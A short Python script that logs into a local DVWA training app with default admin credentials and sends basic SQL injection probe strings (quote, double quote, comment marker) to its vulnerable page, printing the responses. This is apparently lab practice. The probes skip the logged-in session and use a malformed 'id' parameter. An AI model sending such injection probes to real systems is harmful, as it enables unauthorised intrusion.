import requests

s = requests.Session()

login_data = {
    "username": "admin",
    "password": "password",
    "Login": "Login"
}

s.post("http://localhost/DVWA/login.php", data=login_data)

s.get("http://localhost/DVWA/login.php")

payloads = ["1", "'", '"', "--", "'("]

for payload in payloads:
    r = requests.get(
        "http://localhost/DVWA/vulnerabilities/sqli/",
        params={"?id": payload}
    )

    print(payload, r.status_code)
    print(r.text)